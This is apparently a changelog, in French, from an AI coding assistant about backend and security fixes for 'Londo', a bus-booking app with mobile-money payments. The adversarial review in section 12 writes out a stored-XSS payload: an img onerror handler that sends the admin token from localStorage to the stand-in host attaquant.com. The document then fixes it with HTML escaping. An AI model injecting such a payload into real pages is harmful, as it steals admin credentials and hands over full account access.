# Changements apportés — récapitulatif

Ce document résume ce qui a changé par rapport aux fichiers d'origine, et
ce qu'il faut configurer avant de redéployer. Le détail de chaque bug
corrigé (avec fichier + ligne) reste dans `audit-londo-backend.md`.

## 1. Nouvelles variables d'environnement à ajouter

| Variable | Rôle | Exemple |
|---|---|---|
| `AUTH_JWT_SECRET` | Signe les jetons de session émis après OTP | une chaîne aléatoire longue, ex. `openssl rand -hex 32` |
| `ORANGE_RETURN_URL` | Page vers laquelle Orange redirige après paiement réussi | à définir avec votre contact Orange |
| `ORANGE_CANCEL_URL` | Page vers laquelle Orange redirige si l'utilisateur annule | idem |
| `ORANGE_NOTIF_URL` | Webhook serveur-à-serveur d'Orange (notification asynchrone) | idem — non traité par ce lot de correctifs, voir section 4 |
| `ADMIN_TOKEN` | Jeton d'accès au back-office (`londo-backoffice-2.html`) | une chaîne aléatoire longue, ex. `openssl rand -hex 24` |

Sans `AUTH_JWT_SECRET`, `/auth/otp/verifier`, `/reservations` et
`/paiement/*/initier` répondent 503. Sans les trois variables Orange,
`/paiement/orange/initier` répond 503 (MTN continue de fonctionner
indépendamment). Sans `ADMIN_TOKEN`, toutes les routes `/api/admin/*`
répondent 503 (le back-office affiche alors "jeton refusé").

## 2. Base de données

`db/schema.sql` a changé de façon structurelle (nouvelle table `departs`,
`trajets.places` → `trajets.capacite`, `reservations.reduction_fidelite`
supprimée, nouvelles colonnes `jeton_operateur` / `paiement_initie_le`,
nouvelle séquence `reservations_ref_seq`).

- **Base neuve, jamais migrée** : exécutez simplement `npm run migrate`
  (ou collez `schema.sql` dans le SQL Editor de Neon) — rien d'autre à faire.
- **Base déjà en place avec des données réelles** : `schema.sql` ne
  modifiera PAS les tables existantes (`create table if not exists` ne
  touche pas à une table déjà créée). Un bloc de commandes `alter table`
  commenté, prêt à l'emploi, se trouve tout en bas de `schema.sql` — à
  exécuter une fois, manuellement, avant de déployer ce code. C'est
  votre cas (vous avez confirmé que les tables existent déjà) : ce bloc
  inclut aussi une reconstruction du stock `departs` à partir de vos
  réservations existantes (en_attente/payé), pour que les places déjà
  prises par vos données de test restent correctement indisponibles au
  lieu de réapparaître comme libres. Faites une sauvegarde avant de
  l'exécuter.

## 3. Ce qui a été corrigé (voir audit-londo-backend.md pour le détail)

**Backend :**
- 1.1 — places scindées par date (table `departs`)
- 1.2 — authentification par jeton après OTP, exigée sur `/reservations` et `/paiement/*/initier`
- 1.3 — réservation atomique (guarded UPDATE + compensation), fini les lignes orphelines
- 1.4 — nouvelle fonction planifiée `expirer-reservations.js` (toutes les 10 min)
- 1.5 — Orange Money : champs requis ajoutés, `payment_url`/`pay_token` désormais capturés et utilisés
- 1.6 — MTN MoMo : numéro envoyé avec l'indicatif pays (237)
- 2.1 — normalisation téléphone centralisée (`_lib/telephone.js`)
- 2.2 — références générées par séquence (fini les collisions à 5 chiffres aléatoires)
- 2.3 — anti double-déclenchement sur l'initiation de paiement (cooldown 30s)
- 2.4 — recrédit des places rendu atomique (fini le double-comptage)
- 2.6 — `nb_voyageurs` recoupé avec le nombre réel de voyageurs envoyés
- Bonus découvert en cours de correction, puis lui-même corrigé une
  deuxième fois après un vrai test en production : j'avais d'abord
  changé tous les appels `sql(texte, params)` en `sql.query(texte,
  params)` en anticipant à tort une rupture future du driver Neon.
  En réalité `sql.query()` n'existe qu'à partir de la version 1.0 de
  `@neondatabase/serverless` — `package.json` reste fixé sur `^0.10.4`,
  une version antérieure où seule la forme `sql(texte, params)` existe.
  Tous les appels ont été remis à `sql(...)` dans cette version (voir
  `_lib/db.js` pour le détail complet de l'erreur et du correctif).

**Fidélité :** entièrement retirée (backend et client) — plus de seuil,
plus de réduction, plus aucune trace dans les traductions, l'écran de
réservation ou le billet.

**Performance :** cache du jeton MTN, timeout sur les appels sortants
MTN/Orange, cache HTTP léger sur `/agences` et `/tarifs`, insertion des
voyageurs regroupée en une seule requête (au lieu d'une boucle), purge
automatique de `otp_tentatives`.

## 4. Back-office admin

Reconstruit à partir de `londo-backoffice-2.html` (que vous m'avez
transmis) et de votre description du projet — je n'avais pas les
fichiers `admin-*.js` originaux, donc ceux livrés ici sont réécrits
directement contre le nouveau schéma plutôt qu'adaptés depuis les
vôtres :
- `_lib/admin.js` — vérifie l'en-tête `X-Admin-Token` (comparaison à
  temps constant) contre `ADMIN_TOKEN`
- `admin-trajets.js`, `admin-agences.js`, `admin-tarifs.js` — CRUD,
  alignés sur `trajets.capacite` (exposé en JSON sous le nom `places`,
  pour que `londo-backoffice-2.html` fonctionne sans aucune modification)
- `admin-reservations.js` — lecture seule (liste les 100 dernières)
- `netlify.toml` — 4 redirections `/api/admin/*` ajoutées (11 au total,
  cohérent avec ce que vous aviez déjà validé)

Le fichier `netlify.toml` que vous m'avez transmis dans cet échange
était en fait celui que je vous avais moi-même livré précédemment (pas
votre version avec les routes admin) — sans conséquence, je les ai
reconstruites à partir de votre description plus haut dans la
conversation.

## 4bis. Comptes agence (nouveau)

Chaque agence peut maintenant avoir son propre compte, séparé du
back-office administrateur, pour voir uniquement ses propres
réservations et gérer uniquement ses propres trajets (heure, places) —
jamais les données des autres agences.

- **Aucune nouvelle variable d'environnement** : réutilise
  `AUTH_JWT_SECRET` déjà en place, avec un jeton de type différent
  (`agence` plutôt que `client`) pour qu'un jeton client et un jeton
  agence ne soient jamais interchangeables.
- `_lib/motDePasse.js` (nouveau) — hachage bcrypt des mots de passe
  agence. Nouvelle dépendance `bcryptjs` ajoutée à `package.json`.
- `agence-connexion.js` (nouveau) — `POST /api/agence/connexion`,
  identifiant + mot de passe, anti-abus (5 essais/15 min, même principe
  que l'OTP).
- `agence-reservations.js`, `agence-trajets.js` (nouveaux) — toujours
  filtrés par l'`agence_id` dérivé du jeton, jamais par une valeur
  envoyée dans la requête. `agence-trajets.js` permet de modifier heure
  et places, mais pas de créer/supprimer un trajet (ça reste réservé à
  l'administrateur).
- `admin-agences.js` — nouvelle méthode `PUT` pour que l'administrateur
  définisse ou change les identifiants d'une agence (bouton "Créer" /
  "Changer" dans l'onglet Agences du back-office).
- `public/agence.html` (nouveau) — page de connexion + tableau de bord
  dédié à l'agence, à héberger à côté de `londo-backoffice-2.html` (même
  dossier `public/`).
- Nouvelle table `tentatives_connexion` et colonnes
  `agences.identifiant` / `agences.mot_de_passe_hash` dans `schema.sql`
  (bloc de migration mis à jour en conséquence).

**Pour créer le premier compte agence** : back-office admin → onglet
Agences → bouton "Créer" sur la ligne de l'agence → choisissez un
identifiant et un mot de passe (8 caractères minimum) → communiquez-les
à l'agence par un canal de votre choix. Elle se connecte ensuite sur
`votre-site.netlify.app/agence.html`.

## 5. Ce qui n'a PAS été traité, et pourquoi

- **2.5 (QR code / anti-rejeu à l'embarquement)** : nécessite de définir
  qui contrôle les billets et avec quelle interface (une colonne
  `embarque_le` seule ne sert à rien sans un endpoint et un écran pour
  la renseigner). Aucun fichier fourni ne couvre ce contrôle — je n'ai
  pas voulu inventer ce flux sans votre validation. Dites-moi comment
  le contrôle est censé se faire et je peux le construire.
  **Mise à jour du 22/08/2026** : traité depuis — `agence-embarquement.js`
  et l'onglet correspondant dans `agence.html` existent dans ce zip et
  fonctionnent correctement (voir section 7 ci-dessous pour le détail).
- **Webhook Orange (`notif_url`)** : la valeur de la variable d'environnement
  est prévue et transmise à l'initiation, mais aucune fonction ne
  reçoit ce webhook pour l'instant — `paiement-statut.js` continue de
  fonctionner par sondage (polling) côté client, comme pour MTN. Un
  webhook dédié serait plus robuste mais sort du périmètre de cette
  passe de correctifs.
- **Orange Money reste à valider en sandbox réelle** : la structure du
  flux (redirection, `payment_url`, `pay_token`) s'appuie sur la
  documentation publique, pas sur un test contre un compte marchand
  réel — voir les avertissements laissés dans `_lib/orange.js`.

## 6. Fichiers livrés

- `londo-backend-corrige/` — tout le backend (db/, netlify/, netlify.toml, package.json)
- `client/App-26-1-7-2-corrige.js` — le client corrigé (même nom de fichier, à remplacer directement)
- `londo-backoffice-2.html` — inchangé, à redéployer tel quel (aucune modification nécessaire côté HTML)

## 7. Audit indépendant du 22/08/2026 — nouveaux correctifs

Relecture complète et indépendante du backend (v13) et du client
(`App-26-1-7-2-corrige-7.js`), sur 3 axes : failles de sécurité
invisibles, performance sous forte charge, dette technique. Détail
complet (ce qui tient déjà bien, tout ce qui a été trouvé, la liste
hiérarchisée) dans `audit-technique-londo.md`, livré séparément.
Ci-dessous, uniquement les 4 points corrigés dans cette passe :

- **Accaparement de sièges** : `POST /reservations` n'imposait aucune
  limite sur le nombre de réservations `en_attente` qu'un même compte
  pouvait créer — un trajet pouvait être maintenu « complet »
  indéfiniment pour de vrais clients. `reservations.js` refuse
  désormais une nouvelle réservation au-delà de `MAX_RESA_EN_ATTENTE`
  (3) réservations `en_attente` simultanées pour le même
  `telephone_compte`.
- **Harcèlement via paiement** : `telephone_paiement` est saisi
  librement à l'initiation du paiement (voulu : payer pour un tiers),
  et rien ne limitait le nombre de prompts USSD MTN déclenchables vers
  un même numéro cible — combiné à l'accaparement ci-dessus, un vecteur
  de harcèlement via l'infrastructure de paiement de l'app. Nouvelle
  table `paiement_tentatives` (`schema.sql`) et limite de 5 initiations
  MTN / 15 min par numéro cible dans `paiement-initier.js`,
  indépendamment du cooldown de 30s déjà existant par réservation. Ne
  s'applique pas à Orange : ce flux fonctionne par redirection ouverte
  par le payeur lui-même, rien n'est poussé automatiquement vers un
  numéro.
- **`API_URL` codée en dur** sur l'URL Netlify de preview dans le
  client, alors que la version pilotée par variable d'environnement
  était commentée « pour la phase de test réel ». Restaurée
  (`process.env.EXPO_PUBLIC_LONDO_API_URL || '...'`) — comportement
  inchangé aujourd'hui tant que la variable n'est pas définie dans
  Snack. `MODE_DEMO` et `FORCER_MODE_REEL_POUR_TEST` volontairement
  laissés tels quels : les modifier aurait fait sortir l'app du mode
  « toujours le vrai serveur » actuellement utilisé pour tester contre
  le backend réel — à restaurer une fois les tests terminés (voir le
  commentaire déjà présent au-dessus de `MODE_DEMO`).
- **En-têtes de sécurité absents** sur `agence.html` et
  `londo-backoffice-2.html` (toutes deux manipulent un jeton conservé
  côté navigateur). `netlify.toml` définit désormais
  `X-Frame-Options: DENY`, une CSP restrictive (`default-src 'self'` —
  vérifié qu'aucune des deux pages ne charge de ressource externe) et
  `X-Content-Type-Options: nosniff` pour ces deux pages.

**Non traité dans cette passe** (voir `audit-technique-londo.md`,
sections « peut attendre après » et « hypothèses à vérifier ») : index
manquant sur `reservations(agence_id, cree_le)`, pas de garde-fou local
sur les tentatives de vérification OTP, pas de rapport de crash branché
côté client, Orange Money et MTN MoMo jamais vérifiés contre un vrai
sandbox opérateur.

**Fichiers livrés dans cette passe** : `londo-backend-14.zip` (tout le
backend — 34 fichiers, dont 5 modifiés : `reservations.js`,
`paiement-initier.js`, `expirer-reservations.js`, `schema.sql`,
`netlify.toml`, plus ce fichier) et `App-26-1-7-2-corrige-8.js` (client,
une seule ligne modifiée). Si votre base Neon est déjà en place,
n'oubliez pas d'exécuter la nouvelle table du bloc de migration en bas
de `schema.sql` (`paiement_tentatives`) avant de déployer.

## 8. Analytics (PostHog) — 22/08/2026, suite au document ASO partagé

Sur les 5 chantiers du document ASO (review in-app, analytics, push,
CI/CD, deep linking/parrainage, métadonnées store), la plupart supposent
une app déjà en store — pas encore le cas ici. Analytics est le seul
retenu pour cette passe : faisable sans compte développeur Apple/Google,
et compatible Expo Go/Snack — contrairement aux notifications push, qui
ne fonctionnent plus dans Expo Go sur Android depuis le SDK 53 (il
faudrait un vrai build EAS pour les tester, hors du workflow actuel).

- **`App-26-1-7-2-corrige-9.js`** — ajout de `posthog-react-native` (SDK
  sans dépendance native en dehors des packages Expo pris en charge) et
  d'un petit helper `posthogCapturer()`, no-op tant que
  `EXPO_PUBLIC_LONDO_POSTHOG_KEY` n'est pas définie. 5 événements
  capturés, couvrant le tunnel complet : `connexion_reussie` (OTP
  vérifié), `reservation_creee`, `paiement_initie`, `paiement_reussi`,
  `paiement_echoue` (avec le motif : échoué ou expiré) — de quoi
  construire un funnel de conversion et voir où les gens abandonnent,
  exactement ce que demandait le document ASO.
- **Pas de `posthog.identify()`** avec le numéro de compte : choix
  délibéré pour ne pas envoyer de numéro de téléphone à un service
  tiers. L'app reste suivie par l'identifiant anonyme généré par le SDK
  (stable par appareil). À revoir seulement si vous voulez un jour
  relier une session analytics à un client précis.
- **Aucune modification backend** : tout part directement du client
  vers le cloud PostHog.

**À faire de votre côté avant que ça remonte des données :**
1. Créer un compte PostHog (gratuit jusqu'à 1M d'événements/mois) et
   récupérer la clé de projet.
2. Ajouter `posthog-react-native`, `expo-file-system`,
   `expo-application`, `expo-device`, `expo-localization` comme
   dépendances dans le projet Snack.
3. Définir `EXPO_PUBLIC_LONDO_POSTHOG_KEY` avec cette clé.

**Non retenu pour l'instant, et pourquoi** : review in-app et deep
linking ne servent à rien avant une vraie fiche store ; parrainage est
une feature produit à part entière (et une réduction fidélité avait déjà
été retirée de l'appli — à trancher avant d'en relancer une) ; push et
CI/CD demandent d'abord de sortir du workflow Snack/Expo Go actuel (un
vrai build EAS) — à reprendre une fois ce choix fait.

## 9. Erreurs remontées par Snack — 25/08/2026

À partir de captures d'écran du panneau Problems de Snack sur
`App-26-1-7-2-corrige-9.js`. Tout ce qui suit était déjà présent avant
l'ajout de PostHog (section 8) — rien n'a de lien avec ce changement.

- **`App-26-1-7-2-corrige-10.js` — Hook appelé conditionnellement**
  (`EcranTrajetsAgence`, react-hooks/rules-of-hooks) : le `useCallback`
  qui mémoïse `Entete` était placé après `if (!agence) return null`.
  Tant que `agence` reste stable d'un rendu à l'autre ça ne se voit
  jamais, mais au premier rendu où `agence` passe de défini à indéfini
  (ou l'inverse — le composant est monté pendant une redirection),
  React appelle un nombre de Hooks différent d'un rendu à l'autre :
  plantage (« Rendered more hooks than during the previous render »)
  ou état corrompu. `destination` et `total` (dont `Entete` a besoin)
  ne dépendent pas de `agence` — remontés avant l'early-return avec le
  `useCallback` lui-même, sans changer aucune valeur affichée. Vérifié
  qu'un second `Entete` similaire (`EcranAccueil`) n'a pas le même
  problème : pas d'early-return avant lui.
- **4 clés dupliquées** (`no-dupe-keys`, dans `TRADUCTIONS`) :
  `reessayer` et `annuler` étaient chacun définis deux fois dans `fr`
  et dans `en` (une fois dans le bloc principal, une fois dans le bloc
  Calendrier/Calendar). Sans conséquence — même valeur les deux fois,
  donc rien n'était perdu — mais nettoyé : doublons supprimés, une
  seule définition de chaque conservée.
- **2 `useMemo` avec dépendance « inutile »** (`react-hooks/exhaustive-deps`,
  `EcranAccueil` et l'écran d'embarquement) : faux positif — `tick`
  sert exprès de déclencheur pour recalculer le compte à rebours
  d'embarquement toutes les 60s, même si sa valeur n'est pas lue dans
  le calcul. Le retirer casserait le rafraîchissement périodique.
  Supprimé ligne par ligne avec `eslint-disable-next-line`, sur le
  modèle des suppressions déjà présentes ailleurs dans le fichier.
- **8 styles inutilisés** (`react-native/no-unused-styles`) :
  `badgePlaces`, `badgePlacesTxt`, `carteVoir`, `cartePaiement`,
  `montantBox`, `montantLabel`, `montantVal`, `paiementNote` —
  vérifié qu'aucun n'était référencé nulle part avant suppression.
  Zéro impact visuel.

**Non corrigé ici : `package.json` — 2 dépendances en échec de
résolution** (`@expo/config-plugins@*`, `react-native-macos@*`,
« Failed to fetch »). Fichier non fourni, donc pas de correctif direct
possible. Aucune des deux ne vient de la liste demandée pour PostHog
(section 8) : ni l'une ni l'autre n'est nécessaire pour tester dans
Expo Go/Snack — `@expo/config-plugins` ne sert qu'au moment d'un vrai
build EAS, `react-native-macos` est la variante macOS de React Native,
sans rapport avec une app Android/iOS. À essayer dans l'ordre : Retry
(Snack signale un échec réseau, pas une incompatibilité) puis, si ça
persiste, supprimer ces deux lignes de `package.json`.

## 10. Sécurité paiement — 27/08/2026, suite à un document partagé

Document reçu sur 4 points classiques de sécurité paiement (chiffrement
bout en bout, idempotence, rate limiting sur les endpoints de paiement,
vérification serveur). Passés en revue un par un contre le code réel :

- **« Chiffrement bout en bout »** : le terme prête à confusion — un
  vrai chiffrement de bout en bout empêcherait le SERVEUR lui-même de
  lire les montants, ce qui casserait tout calcul/vérification côté
  serveur. Ce qui protège réellement les échanges client↔serveur ici,
  c'est TLS (HTTPS), déjà automatique sur tout le trafic Netlify —
  rien à ajouter.
- **Idempotence — vrai manque, corrigé.** `POST /reservations`
  n'avait aucune protection contre un renvoi de requête après coupure
  réseau (le `chargement` côté client protège seulement le double-tap
  pendant que la requête est en cours, pas le cas où le serveur a créé
  la réservation avec succès mais où la réponse ne revient jamais).
  Ajout d'une `cle_idempotence` (UUID généré une fois par visite de
  l'écran de confirmation, réutilisé à chaque nouvel essai de
  `soumettre()`) : un renvoi avec la même clé renvoie la réservation
  déjà créée au lieu d'en créer une seconde. Contrainte unique sur
  `(telephone_compte, cle_idempotence)` côté base — donc protégé même
  si deux requêtes concurrentes arrivent pile en même temps, pas
  seulement par le SELECT préalable.
- **Rate limiting sur le paiement — déjà largement couvert**, pas
  repris ici : `/paiement/mtn/initier` limité par numéro cible (section
  7), `/reservations` plafonné à 3 réservations en attente par compte
  (section 7), OTP et connexion agence déjà limités (audit initial).
  Reste `/paiement/statut` sans limite propre — mais c'est un endpoint
  de sondage appelé exprès à haute fréquence pendant l'attente d'un
  paiement, protégé par la vérification de propriété (404 si la
  réservation n'appartient pas à l'appelant) plutôt que par un
  compteur. Pas repris ici, effort/risque pas proportionné pour ce
  que ça fermerait en plus.
- **Vérification serveur — déjà la règle partout**, rien à ajouter :
  totaux toujours recalculés côté serveur depuis `tarifs` (jamais
  acceptés du client), `trajet_id` vérifié contre `agence_id`,
  identité toujours dérivée du jeton signé.

**Fichiers touchés** : `App-26-1-7-2-corrige-11.js` (génération et
envoi de `cle_idempotence`), `reservations.js` (vérification +
gestion du conflit de course), `schema.sql` (colonne
`cle_idempotence` + index unique — migration en bas du fichier si la
base est déjà en place).

## 11. Index tableau de bord agence — 29/08/2026

Dernier point resté ouvert depuis l'audit initial (section « peut
attendre après » de `audit-technique-londo.md`) : `agence-reservations.js`
filtre par `agence_id` sans index dédié. Ajouté :
`idx_reservations_agence on reservations(agence_id, cree_le desc)`.
Migration en bas de `schema.sql`. Aucun fichier de fonction modifié —
uniquement `schema.sql`.

## 12. Simulation d'attaque — 30/08/2026

Relecture du code en mode adversarial (« qu'est-ce qu'un pirate
essaierait, et est-ce que ça passe ? ») plutôt qu'un test contre le
site en ligne — je n'ai ni accès réseau ni accès à votre session Snack
depuis mon environnement.

### Trouvé et corrigé : XSS stockée, réservation → jeton admin volé

La plus grave trouvaille de tout ce suivi. `agence.html` et
`londo-backoffice-2.html` injectaient les données serveur (nom du
voyageur en tête) directement via `innerHTML`, sans échappement. Le nom
du voyageur vient tel quel du formulaire de réservation — rempli par
n'importe quel client de l'app, aucun accès particulier requis.

**Chemin d'attaque complet** : un client réserve normalement, avec
comme nom `<img src=x onerror="fetch('https://attaquant.com?t='+
localStorage.getItem('londo_admin_token'))">`. Rien ne bloque cette
étape — c'est un champ texte classique. Quand un administrateur ouvre
ensuite l'onglet Réservations du back-office (`/admin/reservations`
liste TOUTES les agences), le script s'exécute dans sa session, avec
`localStorage` — où vit justement `ADMIN_TOKEN` — directement
accessible. Accès admin complet pour l'attaquant : agences, trajets,
tarifs, toutes les réservations.

Même schéma, moins grave (nécessite déjà un compte agence) : une agence
malveillante ou compromise pouvait injecter via le champ `heure` d'un
de ses trajets, visible ensuite dans le back-office admin aussi.

**Corrigé** : `escapeHtml()` ajouté aux deux fichiers, appliqué à
chaque champ texte issu du serveur avant injection dans le DOM — pas
seulement aux champs identifiés comme risqués aujourd'hui, par prudence
si un futur ajout change ce qui est réellement exploitable. Un
`onclick="...('${a.nom.replace(/'/g, ...)}')"` sur les noms d'agence
n'échappait que le guillemet simple, pas le double qui délimite
l'attribut lui-même — remplacé par un encodage en deux temps
(`JSON.stringify` puis `escapeHtml`) qui protège les deux contextes à
la fois.

### Trouvé, pas corrigé — décisions à prendre

- **Pas de révocation de jeton** : un jeton client volé (téléphone
  perdu, session copiée) reste valide jusqu'à 180 jours, sans moyen de
  l'invalider individuellement — seule option aujourd'hui, faire tourner
  `AUTH_JWT_SECRET`, ce qui déconnecte tout le monde d'un coup. Ajouter
  une liste de révocation est un vrai chantier (table + vérification à
  chaque requête), pas fait ici sans votre feu vert.
- **Limite anti-harcèlement paiement contournable avec plusieurs
  numéros réels** : le plafond par numéro cible (section 7) ne freine
  pas un attaquant qui contrôle plusieurs comptes vérifiés (ferme de
  cartes SIM) — coûteux à monter, mais pas impossible.
- **À anticiper si le webhook Orange est un jour branché** : vérifier
  la signature/l'authenticité de l'appel entrant, sinon n'importe qui
  peut POSTer un faux « paiement réussi » directement sur l'URL du
  webhook. Non exploitable aujourd'hui puisque ce webhook n'existe pas
  encore (fonctionnement par sondage uniquement).

**Fichiers touchés** : `public/agence.html`, `public/londo-backoffice-2.html`.

## 13. Décisions sur les points laissés ouverts — 31/08/2026

Les 3 points listés « à trancher » à la fin de la simulation d'attaque
(section 12), avec la décision prise pour chacun.

- **Pas de révocation de jeton → durée réduite, vraie révocation
  reportée.** Construire une liste de révocation (table + vérification
  à chaque requête authentifiée, aujourd'hui sans état) n'est pas
  justifié tant qu'il n'y a pas d'utilisateurs réels pour qui le risque
  est concret — mais rien ne coûtait à réduire l'exposition en
  attendant. Durée de vie du jeton client passée de 180 à 60 jours
  (`_lib/auth.js`) : réduit la fenêtre d'un facteur 3 sans rien
  construire de nouveau. Seule conséquence pratique : un utilisateur
  inactif plus de 60 jours redemande un code OTP à sa prochaine visite
  — déjà le comportement prévu, juste plus fréquent. À remplacer par
  une vraie révocation une fois l'app en usage réel.
- **Limite anti-harcèlement contournable avec plusieurs numéros →
  second plafond par IP ajouté.** La limite par numéro cible (section 7)
  ne freinait pas un attaquant avec plusieurs comptes vérifiés, chacun
  visant une victime différente. Ajouté un second plafond, par IP cette
  fois, mais volontairement 4x plus large (20 contre 5 par numéro
  cible/15 min) pour ne pas bloquer plusieurs vrais clients au même
  comptoir ou même Wi-Fi — l'objectif est de plafonner un script qui
  arrose beaucoup de numéros depuis une seule source, pas de gêner un
  usage groupé légitime. Nouvelle colonne `paiement_tentatives.ip`
  (migration en bas de `schema.sql`).
- **Authenticité du webhook Orange → rien à faire pour l'instant,
  confirmé.** Ce n'est pas un bug présent : le webhook n'existe pas
  encore (fonctionnement par sondage uniquement), donc rien à corriger
  aujourd'hui. Reste noté pour le jour où `ORANGE_NOTIF_URL` sera
  effectivement branché à une fonction — vérifier la signature de
  l'appel entrant avant de faire confiance à un « paiement réussi »
  reçu sur cette URL.

**Fichiers touchés** : `netlify/functions/_lib/auth.js`,
`netlify/functions/paiement-initier.js`, `db/schema.sql`.
